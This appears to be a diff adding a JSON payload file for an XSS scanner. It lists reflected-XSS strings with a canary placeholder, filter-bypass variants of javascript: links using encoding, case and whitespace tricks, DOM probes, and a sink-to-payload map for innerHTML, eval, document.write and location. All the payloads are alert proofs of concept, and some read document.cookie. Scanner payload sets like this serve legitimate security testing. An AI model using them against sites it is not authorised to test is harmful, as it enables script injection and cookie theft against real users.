@@ -1,0 +1,249 @@
+{
+    "XSS_PAYLOADS": [
+        [
+            "<script>alert(\"{c}\")</script>",
+            "script-tag"
+        ],
+        [
+            "\"><script>alert(\"{c}\")</script>",
+            "breakout-script-tag"
+        ],
+        [
+            "'><script>alert('{c}')</script>",
+            "breakout-single-script"
+        ],
+        [
+            "\"><img src=x onerror=alert(\"{c}\")>",
+            "img-onerror"
+        ],
+        [
+            "\"><svg onload=alert(\"{c}\")>",
+            "svg-onload"
+        ],
+        [
+            "<body onload=alert(\"{c}\")>",
+            "body-onload"
+        ],
+        [
+            "\"><iframe src=\"javascript:alert('{c}')\">",
+            "iframe-javascript"
+        ],
+        [
+            "\"><details open ontoggle=alert(\"{c}\")>",
+            "details-ontoggle"
+        ],
+        [
+            "<marquee onstart=alert(\"{c}\")>",
+            "marquee-onstart"
+        ],
+        [
+            "javascript:alert(\"{c}\")",
+            "javascript-protocol"
+        ],
+        [
+            "javascript://%250Aalert(\"{c}\")",
+            "javascript-bypass"
+        ],
+        [
+            "'-alert(\"{c}\")-'",
+            "js-context-single"
+        ],
+        [
+            "\"-alert(\"{c}\")-\"",
+            "js-context-double"
+        ],
+        [
+            "};alert(\"{c}\");//",
+            "js-context-breakout"
+        ],
+        [
+            "</script><script>alert(\"{c}\")</script>",
+            "script-breakout"
+        ],
+        [
+            "<svg/onload=alert(\"{c}\")>",
+            "svg-slash"
+        ],
+        [
+            "<iMg SrC=x OnErRoR=alert(\"{c}\")>",
+            "mixed-case-img"
+        ],
+        [
+            "<img src=x:x onerror=alert(\"{c}\")>",
+            "img-protocol-bypass"
+        ],
+        [
+            "<a href=\"javascript:alert('{c}')\">click</a>",
+            "anchor-javascript"
+        ],
+        [
+            "<math><mi>//</mi><x/onmouseover=alert(\"{c}\")>",
+            "math-tag-bypass"
+        ],
+        [
+            "{c}",
+            "reflection-check"
+        ]
+    ],
+    "HREF_BYPASS_PAYLOADS": [
+        [
+            "javascript:alert(1)",
+            "href-js-noquote"
+        ],
+        [
+            "javascript:alert(document.domain)",
+            "href-js-domain"
+        ],
+        [
+            "javascript:alert(document.cookie)",
+            "href-js-cookie"
+        ],
+        [
+            "javascript:alert(`{c}`)",
+            "href-js-backtick"
+        ],
+        [
+            "javascript:void(alert(`{c}`))",
+            "href-js-void-backtick"
+        ],
+        [
+            "java&#x73;cript:alert(1)",
+            "href-js-entity-s"
+        ],
+        [
+            "&#106;avascript:alert(1)",
+            "href-js-entity-j"
+        ],
+        [
+            "&#x6A;avascript:alert(1)",
+            "href-js-hex-j"
+        ],
+        [
+            "jaVasCript:/*-*/alert(1)",
+            "href-js-case-comment"
+        ],
+        [
+            "JaVaScRiPt:alert(1)",
+            "href-js-mixedcase"
+        ],
+        [
+            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+            "href-data-uri"
+        ],
+        [
+            "java\tscript:alert(1)",
+            "href-js-tab"
+        ],
+        [
+            "java\nscript:alert(1)",
+            "href-js-newline"
+        ],
+        [
+            "javascript:alert(String.fromCharCode(88,83,83))",
+            "href-js-fromcharcode"
+        ]
+    ],
+    "DOM_PROBE_PAYLOADS": [
+        "<img src=x onerror=alert({c})>",
+        "<script>alert({c})</script>",
+        "<svg onload=alert({c})>",
+        "<body onload=alert({c})>",
+        "\"><script>alert({c})</script>",
+        "'><script>alert({c})</script>",
+        "javascript:alert({c})",
+        "<iframe src=\"javascript:alert({c})\">",
+        "<details open ontoggle=alert({c})>"
+    ],
+    "SINK_EXPLOIT_MAP": {
+        "href": [
+            [
+                "javascript:alert(document.cookie)",
+                "js-proto-cookie"
+            ],
+            [
+                "javascript:alert(1)",
+                "js-proto-simple"
+            ],
+            [
+                "javascript:alert(document.domain)",
+                "js-proto-domain"
+            ]
+        ],
+        "src": [
+            [
+                "javascript:alert(1)",
+                "js-src-proto"
+            ],
+            [
+                "data:text/html,<script>alert(1)</script>",
+                "data-src"
+            ]
+        ],
+        "document.write": [
+            [
+                "\"></select><img src=1 onerror=alert(1)>",
+                "write-select-breakout"
+            ],
+            [
+                "</script><script>alert(1)</script>",
+                "write-script-breakout"
+            ],
+            [
+                "<img src=x onerror=alert(1)>",
+                "write-img"
+            ],
+            [
+                "\"><svg onload=alert(1)>",
+                "write-svg-breakout"
+            ],
+            [
+                "</option></select><img src=x onerror=alert(1)>",
+                "write-option-breakout"
+            ]
+        ],
+        "innerHTML": [
+            [
+                "<img src=x onerror=alert(1)>",
+                "inner-img"
+            ],
+            [
+                "<svg onload=alert(1)>",
+                "inner-svg"
+            ],
+            [
+                "<iframe src=\"javascript:alert(1)\">",
+                "inner-iframe"
+            ]
+        ],
+        "eval": [
+            [
+                "alert(1)",
+                "eval-alert"
+            ],
+            [
+                "1;alert(document.cookie)",
+                "eval-chain"
+            ]
+        ],
+        "location": [
+            [
+                "javascript:alert(1)",
+                "loc-js-proto"
+            ]
+        ],
+        "generic": [
+            [
+                "<script>alert(1)</script>",
+                "generic-script"
+            ],
+            [
+                "<img src=x onerror=alert(1)>",
+                "generic-img"
+            ],
+            [
+                "javascript:alert(1)",
+                "generic-js"
+            ]
+        ]
+    }
+}
